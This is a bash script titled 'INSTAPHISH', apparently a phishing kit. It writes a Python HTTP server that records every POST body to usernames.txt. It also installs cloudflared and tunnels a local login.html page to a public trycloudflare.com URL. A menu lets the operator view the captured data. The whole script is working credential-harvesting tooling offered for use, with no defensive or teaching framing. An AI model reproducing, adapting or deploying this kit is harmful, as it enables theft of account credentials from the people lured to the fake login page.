#!/bin/bash
# This creates the server.py file automatically if it's missing
cat << 'EOF' > server.py
import http.server
import socketserver

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"\n[!] DATA RECEIVED: {post_data}")
        with open("usernames.txt", "a") as f:
            f.write(f"{post_data}\n---\n")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b"OK")

PORT = 8080
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    httpd.serve_forever()
EOF
# Clear terminal screen
clear

# Function to check and install dependencies
install_deps() {
    if ! command -v figlet >/dev/null 2>&1; then
        echo "[+] Installing figlet..."
        sudo apt update && sudo apt install -y figlet
    fi

    if ! command -v cloudflared >/dev/null 2>&1; then
        echo "[+] Installing cloudflared..."
        # Note: Use appropriate architecture for your system (amd64, arm, etc.)
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
        chmod +x cloudflared-linux-amd64
        sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
    fi
}

install_deps

# Big banner
figlet "INSTAPHISH"

echo "------------------------------------------"
echo "1. Start Server & Generate Public URL"
echo "2. View Captured Data (usernames.txt)"
echo "3. Exit"
echo "------------------------------------------"
read -p "Choose an option: " choice

if [ "$choice" -eq 1 ]; then
    # Cleanup: Kill any old processes on port 8080
    echo "[+] Cleaning up old processes..."
    pkill -f "server.py" > /dev/null 2>&1
    pkill -f "cloudflared" > /dev/null 2>&1
    sleep 1

    # Check if required files exist
    if [ ! -f "server.py" ] || [ ! -f "login.html" ]; then
        echo "[-] Error: server.py or login.html not found in this folder!"
        exit 1
    fi

    echo "[+] Starting Custom Python Server on port 8080..."
    python3 server.py > /dev/null 2>&1 &

    echo "[+] Initializing Cloudflare Tunnel..."
    # Remove old logs to ensure we get a fresh URL
    rm -f tunnel.log
    cloudflared tunnel --url http://localhost:8080 > tunnel.log 2>&1 &

    echo "[+] Waiting for Public URL generation (Max 30s)..."
    
    # Loop to wait for the URL to appear in the log file
    timeout=0
    while [ $timeout -lt 15 ]; do
        PUBLIC_URL=$(grep -o 'https://[-a-zA-Z0-9.]*\.trycloudflare.com' tunnel.log | head -n 1)
        if [ -n "$PUBLIC_URL" ]; then
            break
        fi
        echo -n "."
        sleep 2
        ((timeout++))
    done

    # --- ADDED: Process Verification ---
    echo -e "\n[*] Checking Tunnel Process Status:"
    if pgrep -fl cloudflared > /dev/null; then
        pgrep -fl cloudflared
    else
        echo "[-] Tunnel process not detected!"
    fi
    # -----------------------------------

    if [ -z "$PUBLIC_URL" ]; then
        echo -e "\n[-] FAILED to generate URL."
        echo "[!] Troubleshooting:"
        echo "    1. Check your internet connection."
        echo "    2. Run 'cat tunnel.log' to see the specific error."
        exit 1
    fi

    echo -e "\n\n============================================"
    echo -e "  SUCCESS! YOUR PAGE IS ONLINE"
    echo -e "  URL: \033[1;32m$PUBLIC_URL/login.html\033[0m"
    echo -e "============================================"
    echo "[+] Listening for submissions... (Press Ctrl+C to stop)"
    echo "[+] Logs will be saved to: usernames.txt"

    # Attempt to open browser automatically
    xdg-open "$PUBLIC_URL/login.html" > /dev/null 2>&1 &

    # Keep script running to show logs
    tail -f usernames.txt 2>/dev/null || wait

elif [ "$choice" -eq 2 ]; then
    if [ -f "usernames.txt" ]; then
        echo "--- START OF DATA ---"
        cat usernames.txt
        echo "--- END OF DATA ---"
    else
        echo "[-] No data captured yet."
    fi

elif [ "$choice" -eq 3 ]; then
    echo "[+] Shutting down..."
    pkill -f "server.py"
    pkill -f "cloudflared"
    exit
else
    echo "Invalid option"
fi
